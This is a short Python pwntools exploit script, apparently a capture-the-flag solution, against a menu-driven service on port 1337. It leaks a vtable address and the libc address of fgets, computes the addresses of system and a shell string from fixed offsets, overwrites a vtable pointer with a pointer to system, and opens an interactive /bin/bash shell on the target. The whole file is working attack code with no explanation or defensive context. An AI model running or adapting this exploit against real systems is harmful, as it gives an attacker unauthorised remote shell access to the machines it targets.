#!/usr/bin/env python
import pwn
import sys
import struct

c = pwn.remote(sys.argv[1], 1337)
c.send(b"1\n3\n1\n4\n0\n")
c.recvuntil('word: ')
square_vtable = struct.unpack("<I", c.recvline()[0:4])[0]
print "Square vtable at " + hex(square_vtable)
fgets_ptr = square_vtable + (0x3fb4 - 0x3e1c)
c.send(("\n1\n1\n%d\n4\n1\n" % fgets_ptr).encode("utf8"))
c.recvuntil("word: ")
fgets = struct.unpack("<I", c.recvline()[0:4])[0]
system = fgets + (0x3cd10 - 0x65810)
sh = fgets + (0x17b8cf - 0x65810)
print "fgets at " + hex(fgets)
print "system at " + hex(system)
print "sh at " + hex(sh)
c.send(b"\n1\n2\n" + struct.pack("<I", system) + b"\n3\n2\n")
c.recvuntil('number: ')
system_ptr = int(c.recvline())
print "ptr to system at " + hex(system_ptr)
c.send("\n1\n2\n" + struct.pack("<I", system_ptr) + b";/bin/bash\n5\n3\n")
c.interactive()
